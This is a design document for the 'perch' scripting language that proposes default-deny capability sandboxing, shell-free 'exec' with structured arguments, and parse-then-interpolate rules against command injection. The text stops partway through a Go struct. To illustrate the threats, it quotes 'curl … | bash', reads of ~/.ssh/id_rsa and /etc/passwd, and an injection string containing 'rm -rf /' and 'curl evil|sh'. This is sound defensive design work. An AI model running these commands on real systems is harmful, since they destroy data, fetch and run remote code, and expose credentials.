# Sandboxed by design — zero ambient authority

> **The thesis.** A perch program should start with **zero access to anything outside itself**. No shell. No filesystem. No network. No environment variables. No subprocesses. Every external resource a program touches MUST be declared in the file — and if it isn't declared, the op that needs it **fails**. No exceptions, no ambient authority, no "it happened to work because the host allowed it."
>
> This is the [object-capability](https://en.wikipedia.org/wiki/Object-capability_model) / default-deny model applied to the whole language: **the file is a sealed box; the only holes in the box are the ones the author cut on purpose, in writing.**

> **Status (what ships today).** The shell-free subprocess core of this design is now implemented and tested: the **`exec`** op (run a declared binary with structured argv — no shell, no metachar surface), the **`pipe … end`** block (wire stdout→stdin between `exec` stages with in-process pipes), the **`glob`** op (read-scoped wildcard expansion), and the pure line-toolbox (**`grep` `reject` `cut` `head` `tail` `sort_lines` `uniq_lines` `count_lines`**). `exec` is gated by the same declared-`bin` check as `shell`. `exec` reads like a shell: bare flags/paths work unquoted (`exec git log --oneline -10`) and a quoted token keeps embedded spaces as one argv slot (`exec git commit -m "fix the bug"`). Still on the roadmap: the inline `|` / `&&` / `||` operators (§3.3), `with_exec` (§3.4), named capability handles (§3.1), and flipping the *default* from ambient to deny (§8, §11). The per-primitive status table is in [§3.5](#35-the-shell-toolbox-perch-native). The capy grammar-engine gaps this design originally hit have since been fixed upstream — see [capy-limitations.md](capy-limitations.md) for what was resolved and what perch adopted.

---

## 1. Why

Today perch has the inverse default. A freshly written `.perch` can `shell "curl … | bash"`, read `~/.ssh/id_rsa`, write anywhere, and dial any host — unless the *operator* remembers to pass `--no-shell --no-network --no-write …` at launch. Security is opt-**out**, enforced by the person running the file, not declared by the person who wrote it.

That's backwards for the world perch is built for:

- **AI-generated programs.** When an agent writes the `.perch`, "the operator will remember the right flags" is not a control. The file must carry its own limits.
- **Supply-chain.** A recipe you `curl`-and-run should be able to do *only* what it says it does, by construction — not by you guessing the right sandbox flags.
- **Auditability.** "What can this touch?" should be answerable by reading the top of the file, and that answer should be *complete and enforced*, not advisory.

The `requires` block (shipped today) is the seed of this — but it's **opt-in** (only enforces when present) and **partial** (covers bins / hosts / env, not filesystem paths or the shell-capability gate itself). This doc describes finishing the job: making declaration **mandatory and total**.

---

## 2. What counts as an external resource

Every op is exactly one of two kinds.

### Pure ops — always allowed, need no grant

Computation over values already in memory. No I/O, no clock, no entropy, no environment. These can never harm anything, so they're ungated:

`trim` · `lower` · `upper` · `replace` · `split` · `join` · `contains` · `slice` · `format` · `length` · `pad_*` · `repeat` · `md5` · `sha1` · `sha256` (of a **string**) · `crc32` · `base64_*` · `hex_*` · `url_*` · `json_parse` · `json_get` · `json_stringify` · `csv_parse` · `regex_match` · `regex_replace` · `regex_find_all` · `version_extract` · `version_*` compare · `print` / `println` (writing to the program's own stdout is not an external resource) · the control-flow blocks (`if`, `for_each`, `match`, `try`, `parallel`, `timeout`, `retry`).

### Effectful ops — denied unless the matching capability is granted

| Capability | Ops it gates | Grant |
|---|---|---|
| **shell** | `shell`, `shell_output`, `shell_detached` | `shell` + `bin "…"` allowlist |
| **read** | `read_file`, `stat`, `exists`, `is_file`, `is_dir`, `list_dir`, `walk_dir`, `file_size`, `file_mtime`, `sha256_file` / `md5_file` (hashing a **file**) | `read "PATH"…` |
| **write** | `mkdir`, `cp`, `mv`, `rm`, `touch`, `chmod`, `write_file`, `append_file`, `mktemp`, `mktemp_dir`, `gzip`/`ungzip`/`tar_*`/`zip_*` (when writing) | `write "PATH"…` |
| **net** | `http_get`, `http_post`, `http_put`, `http_delete`, `download`, `dns_lookup`, `port_check`, `get_ip` | `net` + `host "…"` allowlist |
| **env** | `get_env`, `set_env`, `unset_env`, and `${UPPER_CASE}` env fall-through | `env "NAME"…` |
| **subprocess** | `pkg_install`, `kill_by_name`, `wasm_run` (it can be granted host imports) | `subprocess` / declared per-op |
| **cwd change** | `cd`, `with_cwd` | covered by **read**/**write** on the target |
| **clock / entropy / sysinfo** | `now`, `format_time`, `get_os`, `get_arch`, `hostname`, `user`, `pid` | low-risk ambient; see §6 — likely allowed by default, but listed for completeness |

The principle: **if the op's behavior depends on, or changes, the world outside this program's own memory and stdout, it needs a grant.**

---

## 3. The target grammar

`requires` becomes the single, mandatory capability manifest. It already declares bins / hosts / env; we extend it with `shell`, `read`, `write`, `net`, `subprocess`, and per-path filesystem scopes:

```perch
requires
    # Subprocess execution — off unless declared, AND every bin is allowlisted.
    # Pin a hash to nail down the exact build (read-only; no version probe).
    shell
        bin "git"
            hash "sha256:abc123…"
        end
        bin "docker"
    end

    # Filesystem — per-path, no ambient access to the rest of the disk.
    read  "./src" "./config" "${home}/.gitconfig"
    write "./build" "./dist" "${temp_dir}/myapp"

    # Network — off unless declared, AND every host is allowlisted.
    net
        host "api.github.com"
        host "*.amazonaws.com"
    end

    # Environment — per-name; nothing else is visible to the program.
    env "HOME" "KUBECONFIG"
    env "DEBUG" optional

    # Host shape (already supported).
    os   "linux" "darwin"
    arch "amd64" "arm64"
end
```

Rules:

- **No `requires` block ⇒ zero external authority.** The program can compute (pure ops) and print, nothing else. A `shell` or `read_file` in such a file errors at parse/preflight time.
- **`read` / `write` take path scopes.** A path is allowed if it's inside one of the declared roots (prefix match on the canonicalized absolute path) or matches a declared glob. `read_file "/etc/passwd"` with only `read "./src"` declared → `read_not_permitted`.
- **`shell` and `net` are two-level.** Declaring `shell` permits subprocess *at all*; the nested `bin` lines say *which*. Same for `net` + `host`. Declaring `shell` with no `bin` lines is a no-op (you permitted the capability but allowlisted nothing) — and `--check` warns.
- **Pure ops are never mentioned.** You never declare "I want to use `upper`."

---

## 3.1 Named external resources (capability handles)

Declaring a resource also **binds it to a name**. You then refer to the resource by that name everywhere in the file, and the reference is **self-validating** — the handle carries its own grant, so using it is proof you declared it. Rename the underlying path/host/version in one place and every call site follows.

### Declaration — `as NAME`

Every `requires` entry gets a name. The name *defaults* to the resource's natural identifier (the bin name, the env-var name); `as NAME` overrides it:

```perch
requires
    bin  "git"                          # handle: git   (defaults to the bin name)
    bin  "kubectl" >= "1.28.0" as kc    # handle: kc    (explicit alias)

    read  "./src"                as src
    read  "${home}/.gitconfig"   as gitconfig
    write "./dist"               as dist

    net  "api.github.com"        as gh
    net  "*.amazonaws.com"       as aws

    env  "KUBECONFIG"            as kubeconfig
    env  "DEBUG" optional        as debug
end
```

A handle is a **file-scoped identifier** (snake_case, no leading digit). It belongs to exactly one kind — *bin*, *path*, *host*, or *env* — and that kind determines where it may be used.

### Reference — use the name, not the string

Each effectful op takes its primary resource **as a handle in a known position**, so the op kind + position tells the validator which namespace to resolve against. Arguments after the handle are **argv tokens** — bare words, exactly like typing at a shell:

```perch
command build
    do
        git status                         # bin handle + bare argv — reads like the shell
        kc apply -f k8s/                   #   (no shell, no string parsing, no metachar surface)

        conf = read_file src config.yaml    # path handle + bare subpath, joined + re-checked
        write_file dist out.txt "${conf}"       # path handle; value with content stays quoted/interpolated

        repo = http_get gh /repos/me/app    # host handle + bare path → https://api.github.com/...
        kube = get_env kubeconfig            # env handle
    end
end
```

### Argument tokens — when do you quote?

After a handle, each token is taken **literally** unless it needs otherwise. The rule is the shell's, not perch's:

| You write | perch sees |
|---|---|
| `exec git status` | argv `["status"]` — bare word, literal |
| `exec git log --oneline -10` | argv `["log","--oneline","-10"]` — flags are just tokens |
| `exec kc apply -f k8s/deploy.yaml` | argv `["apply","-f","k8s/deploy.yaml"]` — slashes/dots are fine bare |
| `exec git commit -m "fix the bug"` | argv `["commit","-m","fix the bug"]` — quote **only** the token with a space |
| `exec git checkout "${branch}"` or `exec git checkout ${branch}` | argv `["checkout", <value of branch>]` — `${…}` interpolates a binding |

So: **bare for plain words and flags, quotes only when a token contains whitespace, `${…}` to splice a value binding.** You never quote `status`, `-f`, or `k8s/` — same as you wouldn't in a terminal.

Semantics:

- **`exec HANDLE token token …`** — `HANDLE` is a *bin* handle; the tokens are argv passed straight to the binary. No shell, no word-splitting of the tokens, so `bin_not_declared` / metachar injection can't happen — the bin is structural and each token is one argv slot.
- **`read_file HANDLE subpath`** — `HANDLE` is a *path* handle naming a read root. The bare subpath is joined and re-canonicalized; if the result escapes the root (via `..`, a symlink, etc.) it's `read_not_permitted`. `read_file HANDLE` alone reads the root if it's a file.
- **`http_get HANDLE path`** — `HANDLE` is a *host* handle. The bare path is appended to the declared host (scheme defaults to `https`; declare `net "http://…"` to allow plain).
- **`get_env HANDLE`** — `HANDLE` is an *env* handle resolving to the declared variable.

> **Why this is safe even though it looks like a shell.** A shell word-splits and re-globs the *whole line*, which is where injection lives. Here, each token is captured by the parser as exactly one argv element and handed to `exec` untouched — `exec git commit -m "${msg}"` puts the entire `${msg}` value in one argv slot even if it contains spaces, semicolons, or `$(…)`. It reads like a shell but has none of the shell's re-interpretation.

### Validation — the reference is the proof

Every handle reference is checked **statically** by `perch --check` and at runtime by the capability gate:

| Situation | Result |
|---|---|
| Handle used but never declared in `requires` | `unknown_capability` (static error — `--check` fails) |
| Handle used in the wrong position (a *path* handle where a *bin* is expected) | `capability_kind_mismatch` (static error) |
| Path-handle subpath escapes the declared root | `read_not_permitted` / `write_not_permitted` (runtime) |
| Everything resolves | runs; the gate is satisfied because the handle *is* a grant |

Because the handle can only exist if it was declared, **referencing it is the validation** — there's no separate "is this allowed?" check to forget. Unknown handle ⇒ the file doesn't compile.

### Why this is better than bare strings

- **One source of truth.** The host `api.github.com`, the path `./src`, the kubectl version floor — each is written once. Bump it in the `requires` block; every call site updates automatically.
- **Refactor-safe.** Move a service to a new host: change `net "…" as gh` and nothing else. Call sites say `gh`, not the literal.
- **No string-sniffing.** `exec git status` is unambiguously a declared bin + argv. The validator never has to parse a shell string to discover what bin ran — eliminating both the static-analysis guesswork and the injection surface.
- **Reads as intent.** `http_get gh "/repos"` says "talk to the GitHub handle," not "dial whatever this string resolves to." Reviewers see the capability, not the plumbing.
- **Diff-friendly for audits.** A PR that adds a capability adds a *named line to `requires`* — the reviewable unit is "this file now has a handle `aws`," not "grep the body for new hosts."

### Disambiguation from value bindings

perch already has value bindings (`url = …`, `${url}`) and the bare-ident arg form (`print url`). Capability handles are a **separate namespace**, resolved by op-position: the first arg of `exec` / `read_file` / `http_get` / `get_env` is a *handle*, not a value binding. Where ambiguity would arise, the value form stays available with the string syntax (`http_get "${url}"`), and the handle form is the bare ident (`http_get gh "/path"`). `--check` flags a bare ident in a handle position that matches no declared handle.

### Honest caveats

- This needs the capability model from §2–§4 to exist first; handles are sugar **over** the grants, not a replacement for them.
- Handles are file-scoped. Imported files (`import "./lib.perch"`) would need either their own `requires` or an explicit re-export rule — TBD, tracked with the import design.
- A path handle is still a *prefix/glob* grant, not a chroot (§10) — the subpath re-check reduces, but a hardened canonicalizer is what closes `..`/symlink escapes.

---

## 3.2 Removing `shell` entirely — only declared binaries

The strongest version of this model **deletes the `shell` op altogether.** There is no `sh -c`, no shell string, no `--no-shell-metachars` flag, no allowlist-parsing of a command line. The *only* way to run a subprocess is to exec a declared binary with structured argv:

```perch
# Today
shell "docker ps -q -f name=^web$ | wc -l"

# Sandboxed-by-design, shell removed (ships today). Bare flags/filters
# need no quotes; a quoted token keeps embedded spaces as one slot.
n =
    pipe
        docker ps -q -f name=^web$
        wc -l
    end
```

A subprocess is always `exec <declared-bin-handle> <token> <token> …`. Each token is one argv slot; nothing is ever handed to a shell to re-interpret.

### Pros

- **The single largest attack surface disappears — structurally, not by policy.** Every HIGH finding `--scan` raises today is a shell-string problem: catch→`shell ${proxy_args}`, unvalidated `${var}` in a shell command, `curl … | bash`. With no `shell` op there is *nothing to inject into*. `--no-shell-metachars`, `checkShell`, first-token allowlist parsing, the metachar denylist — all of it becomes dead code you can delete.
- **Subprocess analysis becomes total and trivial.** "Which binaries can this file run?" has an exact, static answer: the set of declared bin handles. No more "we can't tell what this shell string runs because it's interpolated." `--scan` / `--check` / `simulate` go from *heuristic* to *complete*.
- **The capability model has no second-class hole.** Today `shell` is a megacapability — grant it and the named bin can pipe into anything. With exec-only, "subprocess" is exactly the declared bins and their declared argv shapes; there's no "...and also a shell that can run arbitrary pipelines."
- **True cross-platform.** `exec git status` behaves identically on macOS / Linux / Windows. `shell "a && b"` depends on `sh` vs `bash` vs `cmd.exe` existing and agreeing on `&&`, quoting, and glob rules — the exact "works on my machine" problem perch exists to kill.
- **It forces composition into perch, where it's inspectable.** A pipeline expressed as perch ops (capture → transform → next) is visible to the audit log, the span tree, and the validator. A pipeline buried in a shell string is opaque to all three.

### Cons / what you lose

- **Pipes.** `a | b | c` is the thing people will miss most. Without a shell you compose by capturing output and feeding the next op — more verbose, and genuinely awkward for long pipelines until perch grows first-class plumbing (see *What perch must add* below).
- **Globbing.** `rm *.tmp` relies on the shell expanding the glob. Exec-only means `*.tmp` reaches the program literally — you'd `walk_dir` + filter + `rm` each, unless perch ships a `glob` op.
- **`&&` / `||` / `;` one-liners.** Replaced by perch's own sequencing (ops run in order), `if`, and `try`. Mostly a wash, but `mkdir x && cd x` becomes two lines.
- **Env-assignment prefixes.** `GOOS=linux go build` is shell syntax. Becomes `with_env "GOOS=linux" … exec go build … end` — more structured, more typing.
- **Heredocs / process substitution / shell builtins.** `cat <<EOF`, `<(…)`, `${VAR:-default}` — gone. Each needs a perch equivalent (`write_file` for heredocs, etc.).
- **Migration cost is real and large.** Every existing `.perch` and recipe that uses `shell` must be rewritten. The current recipes are docker-heavy and lean on pipes (`docker ps … | …`); converting them is non-trivial.
- **The escape-hatch tail.** Occasionally you genuinely need a shell — a gnarly one-off pipeline, or a vendor tool whose only documented invocation is a shell line. "perch literally cannot do what bash can here" will frustrate some users for that tail of cases.

### What perch must add first to make this viable

Removing `shell` is only reasonable once the common shell idioms have first-class, shell-free replacements:

- **A `pipe` block** that wires `stdout → stdin` between declared bins without a shell:
  ```perch
  pipe
      docker ps -q
      wc -l
  end                                  # → no sh -c; perch connects the pipes
  ```
- **A `glob` op** — `files = glob "*.tmp"` (scoped to a declared `read` root) so wildcard removal/iteration has a structured form.
- **`with_env`** (already exists) covers env prefixes; **ops run in sequence** already covers `;`; **`if` / `try`** cover `&&` / `||`.
- **Output capture + the string/JSON/regex ops** (already exist) cover most of what a pipeline's middle stages did with `grep`/`awk`/`sed`.

### The honest escape hatch

For the irreducible tail that truly needs a shell pipeline: **don't put it in an inline string — put it in a file, declare it, and pin it.**

```perch
requires
    shell                                   # the capability, if we keep a gated form
        bin "./scripts/pipeline.sh" hash "sha256:…"
    end
end

command report
    do
        ./scripts/pipeline.sh "${date}"   # the shell complexity is a named, hash-pinned artifact
    end
end
```

Now the shell lives in a reviewable, hash-pinned `.sh` file that the manifest declares — not in an ambient inline string. The "everything external is declared and pinned" invariant holds even for the shell escape. This is the middle path between "keep inline `shell`" and "remove it with no recourse."

### Verdict (for discussion)

Three positions, weakest → strongest:

1. **Keep `shell`, gate it** (`shell { bin … }` capability, §3). Lowest migration cost; preserves pipes; but the metachar/injection surface and the "shell is a megacapability" hole remain.
2. **Remove inline `shell`, allow exec-of-declared-shell-script** (the escape hatch above). Eliminates the inline-injection surface; pipelines that truly need a shell become declared, hash-pinned files; cost is rewriting recipes + building `pipe`/`glob`.
3. **Remove `shell` and any shell entirely** — only `exec` of declared non-shell bins, pipelines only via perch's `pipe`. Maximum guarantee ("no shell anywhere, ever"); highest cost; the escape-hatch tail has no recourse but to ship a non-shell helper binary.

Position **2** is the recommended target: it delivers nearly all the security value of **3** (no inline shell string, nothing to inject into) while leaving a declared, pinned path for the genuinely-needs-a-shell tail. **3** is the purist end state worth reaching only after `pipe`/`glob` have proven they cover the real recipes without a shell. **1** is the pragmatic first step that ships without a recipe rewrite.

---

## 3.3 Bringing back `&&` / `||` / `;` and `KEY=val` — without a shell

Removing `shell` doesn't mean giving up the *ergonomics* people associate with it. The two most-missed shell features — conditional chaining (`&&` / `||` / `;`) and per-command env prefixes (`GOOS=linux …`) — can come back as **perch grammar around `exec`**. The difference from a shell is the whole point: perch parses these as structure; they never become a string an external shell re-interprets.

### Chaining operators are perch operators, not shell metachars

```perch
git pull && go build && go test     # each clause is a structured exec
which gh || brew install gh              # RHS runs only if LHS failed
stop_old ; start_new                     # run both regardless
```

These parse into a chain of `exec` clauses joined by perch-level operators. Each clause is still `exec <declared-bin> <tokens>` — there is no `sh -c`, no word-splitting of a line, no glob. The operators are evaluated by the interpreter on the **exit code** of each clause:

| Operator | Meaning |
|---|---|
| `A && B` | run `A`; run `B` only if `A` exited `0`. Short-circuits left→right. |
| `A \|\| B` | run `A`; run `B` only if `A` exited non-zero. |
| `A ; B` | run `A`, then `B`, regardless of `A`'s exit. (Same as two lines; offered for one-liners.) |

Semantics worth pinning down:

- **A bare `exec` that exits non-zero raises** (perch's normal error model — aborts the command unless caught by `try`). Inside a `&&`/`||` chain, the operator *consumes* the exit code instead: `exec a && exec b` does **not** raise if `a` fails — it just skips `b`. The chain raises only if its **last actually-run** clause exits non-zero. (If you want "abort on any failure," that's the default sequential form — separate lines.)
- **In an `if` condition the chain is boolean.** `if exec test -f x && exec grep -q foo x ... end` is true iff the whole chain succeeded — no abort, the exit codes drive the branch.
- **Operators can only be literal source tokens.** They are recognized by the parser between `exec` clauses; an interpolated `${x}` can never *become* an `&&` (see the keystone below). You cannot construct an operator at runtime.

This is sugar over control flow perch already has (`if exit_code == 0`, sequential ops, `try`), surfaced in a form that reads like the shell line it replaces — but with each command structurally bound to a declared bin.

### Per-`exec` env prefixes

```perch
GOOS=linux GOARCH=arm64 go build -o out ./cmd      # KEY=val prefixes scope to this one exec
```

The leading `KEY=val` tokens are parsed as a **localized environment overlay** for that single `exec` — sugar for wrapping it in `with_env`. Rules:

- The bin is the **first non-assignment token** (`go` here), and it must be a declared handle — `GOOS=linux` does not make `GOOS` the bin.
- Each `KEY=val` is one structured assignment; the value may interpolate (`GOOS=${target}`) but interpolation fills only that value slot.
- The overlay is scoped to the single `exec` and restored after — it does not leak to later ops (unlike `export`/`set_env`, which are deliberate process-lifetime changes).

### The keystone: parse first, interpolate second — *never* the reverse

This is the single most important rule that makes all of the above safe, and it's the exact inversion of how a shell works:

> **A `${var}` can only become the content of a slot that already exists in the already-parsed structure** — one argv token, or one `KEY=val` value. It can **never** introduce a new token, a new `KEY=val`, an operator (`&&`/`||`/`;`), a redirect, a glob, or a second command.

Shells do **interpolate-then-parse**: they splice `$var` into the command line and *then* lex/parse the result, so a value containing `; rm -rf /` becomes new syntax. perch does **parse-then-interpolate**: the structure (bin handle, argv slots, env slots, chain operators) is fixed by the parser *before* any `${var}` is resolved, and resolution only fills leaf slots.

Concretely:

```perch
# msg = "v1.0; rm -rf / && curl evil|sh"
git commit -m "${msg}"
```

`git` receives exactly one `-m` argument whose value is the literal string `v1.0; rm -rf / && curl evil|sh`. The `;`, `&&`, `|` are **data inside one argv slot** — not operators, not new commands. There is no parse step after interpolation for them to influence. The same value in a shell (`git commit -m "$msg"` without perfect quoting) is a catastrophe; here it is simply a weird commit message.

This is why `&&`/`||`/env-prefixes can be added back without reopening the injection hole: they exist **only** as literal structure the author typed, fixed before any untrusted value is substituted.

---

## 3.4 `with_exec BIN … end` — a bin-scoped block

When you call the *same* binary several times in a row — `docker compose up`, `docker compose exec …`, `docker ps` — repeating `exec docker` on every line is noise. `with_exec` scopes a declared bin handle so each line inside the block is an invocation of it:

```perch
with_exec docker
    compose up -d
    compose exec api migrate up
    ps
end
```

is exactly equivalent to:

```perch
docker compose up -d
docker compose exec api migrate up
docker ps
```

This is the same family as `with_env` / `with_cwd` — a context block that factors a shared setting out of the body. Here the shared setting is *which bin runs*.

### Rules

- **The block head names a declared bin handle** (`docker` must be in `requires`). It's declared once, at the block head — reinforcing "always a defined bin," never a string.
- **Each bare line is the argv** passed to that bin, same token rules as inline `exec` (§3.1: bare words literal, quote only for spaces, `${…}` fills one slot).
- **Lines run top-to-bottom; a failing line raises** (perch's normal abort-on-error). That gives you `&&`-style "stop on first failure" sequencing for free — which is what a multi-step session with one tool almost always wants. To continue past a failure, use `|| exec …` on that line or wrap it in `try`.
- **An inner line may start with its own `exec`** to call a *different* bin — it overrides the scoped bin for that line only:
  ```perch
  with_exec docker
      compose build
      cosign sign myimage:latest    # different (also-declared) bin, one line
      compose push
  end
  ```
- **Composes with the other context blocks.** Wrap in `with_cwd` / `with_env` to add a shared directory or environment:
  ```perch
  with_cwd src
      with_env "DOCKER_BUILDKIT=1"
          with_exec docker
              build -t app .
              push app
          end
      end
  end
  ```

### How it relates to the other forms

| Form | Use when |
|---|---|
| `exec BIN args` | a one-off call |
| `exec a && exec b` (§3.3) | two-or-three commands with conditional/exit-code logic on one line |
| `with_exec BIN … end` | several calls to the **same** bin in sequence (abort on first failure) |
| `pipe … end` (§3.2) | wiring one command's **stdout into another's stdin** (no shell) |

### Honest notes

- It's pure sugar — it lowers to a sequence of `exec BIN …` ops, so it adds nothing to the capability model and changes no security property. The bin is still a declared handle; tokens are still structured argv; interpolation still fills leaf slots only (§3.3 keystone).
- It only helps when you're calling **one** bin repeatedly. Mixed-bin sequences read better as plain `exec` lines.
- Branching inside the block uses perch's normal `if` / `try`; `with_exec` doesn't introduce its own control flow.

---

## 3.5 The shell toolbox, perch-native

The pitch: **keep the syntax people already know — `|`, `&&`, `||`, `<` — but perch parses every command and manages every process itself.** A pipeline isn't handed to `sh -c`; perch lexes it into a list of `exec <declared-bin> <argv>` stages and wires them with in-process `os.Pipe`s. Same shape on the page, none of the shell's word-splitting / globbing / re-interpretation. This section shows how each shell idiom is expressed with the **current op catalog** (marked *exists*) plus the few primitives this design adds (marked *proposed*).

A note on legend: **(exists)** = shippable today with the current ops; **(proposed)** = a small new op/operator this design introduces.

### Pipe — stdout → stdin wiring  *(proposed: the `|` operator + `pipe` block)*

`|` is a perch operator (like `&&`), parsed between `exec` clauses. perch opens an `io.Pipe` between stage N's stdout and stage N+1's stdin — no shell.

```perch
# bash:  docker ps -q | wc -l
n = exec docker ps -q | exec wc -l            # inline, two stages

# bash:  kubectl get pods -o json | jq -r '.items[].metadata.name' | sort
names =
    pipe
        kubectl get pods -o json
        jq -r ".items[].metadata.name"
        sort
    end                                            # block form for 3+ stages
```

- Every stage is still `exec <declared-bin> <structured-argv>`. The `|` never reaches a shell; it's process plumbing perch owns.
- The chain's value is the **last stage's stdout** (capturable with `let`). Its exit status follows §3.3 rules (a failing stage raises unless consumed).
- A pipeline of declared bins is fully analyzable: `--scan` lists every bin in the chain; there's no opaque shell string.

### stdin from a value  *(proposed: `|` accepts a string on its left)*

The left side of `|` may be a **string value** instead of an `exec` — perch feeds it to the right stage's stdin. This replaces `echo … |` and heredocs:

```perch
# bash:  echo "$json" | jq '.name'
name = "${json}" | exec jq -r ".name"

# bash:  jq '.x' <<< "$data"
x = "${data}" | exec jq ".x"
```

`"${json}"` is one stdin stream, never re-parsed — the §3.3 keystone holds: an interpolated value can only ever be *data on a stream*, never new commands.

### Glob — expand wildcards  *(exists via `walk_dir`; proposed sugar: `glob`)*

The shell expands `*.tmp` before the command sees it. perch never does ambient globbing — you ask for matches explicitly, scoped to a declared `read` root.

```perch
# today (exists): walk + filter
all = walk_dir src
for_each all f
    if regex_match "\\.tmp$" f
        rm f                                       # within a declared write root
    end
end

# proposed sugar: one op
tmp = glob "src/**/*.tmp"                       # list, scoped to read root `src`
for_each tmp f
    rm f
end
```

`glob` is sugar over `walk_dir` + a pattern match; it never escapes the declared root (the §10 canonicalizer applies).

### Stream transforms — replace grep / sed / awk / cut / head / sort / uniq / wc

Work on captured output as **lines**. Most of this exists today with string/regex ops; a thin line-oriented layer makes it ergonomic.

| Shell | perch (exists) | perch (proposed sugar) |
|---|---|---|
| `… \| grep PAT` | `for_each (split out "\n") l` + `if regex_match PAT l` | `grep PAT out` → matching lines |
| `… \| grep -v PAT` | same with `if not regex_match` | `reject PAT out` |
| `… \| sed 's/a/b/g'` | `regex_replace "a" "b" out` | — (already one op) |
| `… \| awk '{print $2}'` | `split line " "` then index `_1` | `cut 2 out` (whitespace columns) |
| `… \| cut -d, -f1` | `split line ","` then index `_0` | `cut 1 out sep=","` |
| `… \| head -n 5` | `slice lines 0 5` | `head 5 out` |
| `… \| tail -n 5` | `slice lines -5` | `tail 5 out` |
| `… \| sort` | — | `sort_lines out` |
| `… \| uniq` | — | `uniq_lines out` |
| `… \| wc -l` | `length (split out "\n")` | `count_lines out` |

```perch
# bash:  git log --oneline | grep fix | head -5
log = git log --oneline
fixes =
    pipe_value log                 # proposed: thread a value through line transforms
        | grep "fix"
        | head 5
    end
# or, with today's ops only:
lines = split "${log}" "\n"
for_each lines l
    if contains l "fix"
        print l
    end
end
```

The proposed `lines`/`grep`/`cut`/`head`/`tail`/`sort_lines`/`uniq_lines`/`count_lines` are all **pure ops** (string→string, no capability) — they need no grant and compose with `|` on values.

### Process composition — prefer native over piping to a tool

The most ergonomic move is often to **skip the external tool entirely**. perch ships `json_parse` / `json_get` / `json_count`, so the classic `… | jq` is frequently unnecessary:

```perch
# bash:  kubectl get pods -o json | jq -r '.items[0].metadata.name'
raw  = kubectl get pods -o json
name = json_get "${raw}" ".items[0].metadata.name"     # no jq, no pipe, no second bin to declare
```

When you *do* compose tools, do it with managed pipes (above), `&&`/`||` (§3.3), `with_exec` (§3.4), and `for_each` over captured lists — every step a declared bin, every wire owned by perch.

### JSON / text ergonomics  *(mostly exists)*

The building blocks shipping today:

```perch
body = curl -s https://api.github.com/repos/me/app    # (curl declared)
stars = json_get "${body}" ".stargazers_count"
topics = json_count "${body}" ".topics"
print "${stars} stars, ${topics} topics"

# text munging without sed/awk:
csv  = read_file data "report.csv"
rows = csv_parse csv                       # exists
first = split (slice rows 0 1) ","         # first row → fields

# build JSON safely (single-quote delimiter avoids escaping the "):
payload = format '{"name":"${name}","count":${count}}'
"${payload}" | exec http post-helper            # or use http_post directly
```

`json_parse` · `json_get` (path) · `json_count` · `json_stringify` · `csv_parse` · `split` / `join` · `regex_*` · `format` · `trim` / `lower` / `upper` are all **pure** — no capability, no shell, cross-platform identical.

### Summary — what ships when

| Primitive | Status |
|---|---|
| `exec` of a declared bin with structured argv | **ships** (core of §3.2) — `exec BIN tok…`; bare flags/paths unquoted, quote only tokens with spaces |
| `pipe … end` block (stdout→stdin between exec stages, no shell) | **ships** — `out = pipe … end` captures the final stage |
| `glob` | **ships** (read-scoped) |
| `grep` / `reject` / `cut` / `head` / `tail` / `sort_lines` / `uniq_lines` / `count_lines` | **ships** (pure ops) |
| `&&` / `\|\|` / `;` between execs | proposed (§3.3) |
| `with_exec BIN … end` | proposed (§3.4) |
| `\|` inline pipe operator + string-on-left (stdin feed) | proposed (the `pipe … end` block ships; the inline `\|` operator does not) |
| `split` / `join` / `slice` / `regex_match` / `regex_replace` / `regex_find_all` / `length` / `contains` / `format` / `trim` / `lower` / `upper` | **exists** |
| `json_parse` / `json_get` / `json_count` / `json_stringify` / `csv_parse` | **exists** |
| `read_file` / `write_file` / `walk_dir` / `list_dir` / `for_each` | **exists** |

The through-line: **perch already has the value-manipulation half of the shell toolbox (string/JSON/regex/list ops are pure and shipping).** What's missing is the *process* half — `exec`, the `|`/`&&`/`||` operators, and a little line-oriented sugar — and all of it is perch-managed, so the shell's syntax survives while the shell itself, and its injection surface, does not.

---

## 4. Enforcement model

One new layer in the interpreter: **a capability check before every op dispatch.**

```
for each op about to run:
    cap := capabilityOf(op.Kind, op.Args)   // from the classification table (§2)
    if cap == None: proceed
    if program.Grants.Permits(cap, op.Args): proceed
    else: return *_not_permitted error      // typed, matchable in try/rescue
```

- **Default-deny.** `program.Grants` is built solely from the `requires` block. Empty block (or no block) ⇒ permits nothing effectful.
- **Path checks** canonicalize then prefix/glob-match against `read`/`write` roots.
- **Host checks** reuse today's allowlist logic.
- **Operator flags still compose AND-wise.** `--no-network` at launch can *further* restrict below what the file declared, but can never grant beyond it. The file's `requires` is the ceiling; operator flags lower it. Neither can exceed the other — same intersection model perch already uses, but now the file's side defaults to **nothing** instead of **everything**.

New error kinds: `shell_not_permitted`, `read_not_permitted`, `write_not_permitted`, `net_not_permitted`, `env_not_permitted`, `subprocess_not_permitted` — joining the existing `bin_not_declared` / `host_not_declared` / `env_not_declared` (which become the *finer-grained* failures once the capability itself is permitted). The named-handle layer (§3.1) adds two **static** kinds surfaced by `perch --check`: `unknown_capability` (a handle that was never declared) and `capability_kind_mismatch` (a handle used in the wrong position).

---

## 5. Where this differs from today (gap analysis)

| Dimension | Today | Target |
|---|---|---|
| Default authority | **Ambient — everything** (shell, fs, net, env all work) | **Zero** — nothing works until declared |
| `requires` block | Opt-in (enforces only when present) | Mandatory semantics (absence = deny-all) |
| Shell | On by default; `--no-shell` to remove | Off by default; `shell { … }` to add |
| Filesystem | On by default, whole disk; `--no-write` / write-roots to narrow | Off by default; `read`/`write` per-path to add |
| Network | On by default (SSRF-guarded); `--allow-host` to pin | Off by default; `net { host … }` to add |
| Env | All host env visible; `--env A,B` to narrow | Nothing visible; `env "A"` to add |
| Who sets the policy | The **operator**, at launch, via flags | The **author**, in the file, by declaration (operator can only tighten) |
| Enforcement point | Scattered (per-op restriction layer, opt-in) | One capability gate, every op, always |

The pieces already in place that this builds on: the `requires` parser + domain types, the `bin_not_declared` / `host_not_declared` / `env_not_declared` runtime guards, the static `perch --check` enforcement, the HTTP SSRF/allowlist layer, the `sandbox` block's static checker, and the per-op restriction hooks (`ApplyRestrictions`). The work is to **unify them under one default-deny gate and extend coverage to filesystem paths and the shell/net capability switches.**

---

## 6. What would have to change — code

Concrete, by VHCO layer:

**`domain/program.go`** — extend `Requirements`:
```go
type Requirements struct {
    Declared    bool
    Shell       bool        // `shell` capability permitted at all
    Net         bool        // `net` capability permitted at all
    Subprocess  bool
    Bins        []BinReq    // (exists)
    Hosts       []HostReq   // (exists)
    Envs        []EnvReq    // (exists)
